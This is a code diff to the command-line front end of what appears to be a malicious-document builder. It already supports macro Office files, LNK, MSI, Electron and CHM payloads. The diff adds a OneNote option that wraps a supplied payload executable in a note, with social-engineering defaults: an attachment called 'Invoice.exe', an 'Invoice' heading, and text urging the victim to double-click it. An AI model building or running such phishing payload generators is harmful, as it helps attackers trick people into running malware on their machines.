@@ -29,6 +29,7 @@ import logging
 
 from modules.compile_electron import compile_electron
 from modules.trigger_chm import compile_chm
+from modules.trigger_onenote import create_onenote
 
 # Setup logging
 logging.basicConfig(
@@ -1514,7 +1515,7 @@ def main():
 
     parser.add_argument(
         'command',
-        choices=['verify', 'excel', 'xlsx', 'xlsm', 'xlam', 'docm', 'doc', 'pptm', 'ppam', 'lnk', 'msi', 'electron', 'chm'],
+        choices=['verify', 'excel', 'xlsx', 'xlsm', 'xlam', 'docm', 'doc', 'pptm', 'ppam', 'lnk', 'msi', 'electron', 'chm', 'onenote'],
         help='Build/create command to execute'
     )
 
@@ -1676,6 +1677,25 @@ def main():
         help='Path to payload executable or DLL'
     )
 
+    # Arguments for OneNote trigger
+    parser.add_argument(
+        '--attachment-name',
+        default='Invoice.exe',
+        help='Filename shown to the victim in OneNote (default: Invoice.exe)'
+    )
+
+    parser.add_argument(
+        '--note-title',
+        default='Invoice',
+        help='OneNote page heading (default: Invoice)'
+    )
+
+    parser.add_argument(
+        '--lure-text',
+        default='Please double-click the attachment below to view the document.',
+        help='Body text displayed above the attachment icon'
+    )
+
     parser.add_argument(
         '--attack-type',
         choices=['execute', 'run-exe', 'load-dll', 'dotnet', 'script'],
@@ -1765,6 +1785,9 @@ def main():
     elif args.command == 'chm':
         if not args.project_dir:
             parser.error("--project-dir is required for chm command")
+    elif args.command == 'onenote':
+        if not args.payload:
+            parser.error("--payload is required for onenote command")
 
     # Load config file if it exists
     config_path = Path(__file__).parent / 'config.ini'
@@ -1905,6 +1928,24 @@ def main():
                 success = ok
             except Exception as e:
                 logger.error(f"CHM compilation failed: {e}")
+                success = False
+
+        elif args.command == 'onenote':
+            try:
+                ok, msg = create_onenote(
+                    payload_path=args.payload,
+                    attachment_name=args.attachment_name,
+                    output_path=args.output,
+                    note_title=args.note_title,
+                    lure_text=args.lure_text,
+                )
+                if not ok:
+                    logger.error(f"OneNote creation failed: {msg}")
+                else:
+                    logger.info(msg)
+                success = ok
+            except Exception as e:
+                logger.error(f"OneNote creation failed: {e}")
                 success = False
 
         elif args.command == 'msi':
